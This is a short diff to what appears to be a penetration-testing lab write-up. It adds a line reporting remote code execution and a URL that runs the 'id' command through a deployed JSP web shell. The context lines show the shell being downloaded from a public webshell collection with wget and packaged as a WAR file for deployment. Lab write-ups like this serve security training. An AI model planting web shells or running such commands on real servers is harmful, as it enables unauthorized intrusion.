@@ -37,3 +37,7 @@ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp
 zip -r backup.war cmd.jsp
 ````
 and click deploy (buckup.war)
+we got RCE :)))
+````bash
+http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+````
